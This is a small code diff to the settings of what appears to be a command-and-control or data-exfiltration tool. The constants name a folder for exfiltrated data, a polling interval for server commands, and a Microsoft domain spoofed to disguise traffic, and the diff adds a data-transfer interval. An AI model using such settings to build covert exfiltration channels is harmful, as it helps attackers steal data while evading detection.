@@ -13,12 +13,13 @@ DEFAULT_DATA_DIR = './data' # Storage of exfiltrated data
 DEFAULT_CLIENT_PING_INTERVAL = '60' # Measured in minutes for checking commands on server
 DEFAULT_CLIENT_DOMAIN = 'cp501-prod.do.dsp.microsoft.com' # Domain to spoof requests with
 DEFAULT_CLIENT_CNAME = 'cp501-prod.dodsp.mp.microsoft.com.nsatc.net'
+DEFAULT_CLIENT_DATA_TRANSFER_INTERVAL = 1
 
 # Config files
 CONFIG_SERVER = 'SERVER'
 CONFIG_CLIENT = 'CLIENT'
 CONFIG_SERVER_KEYS = ['interface', 'data_dir']
-CONFIG_CLIENT_KEYS = ['client_ping_interval', 'client_domain', 'client_cname']
+CONFIG_CLIENT_KEYS = ['client_ping_interval', 'client_domain', 'client_cname', 'client_data_transfer_interval']
 
 def default_server_conf():
     return {
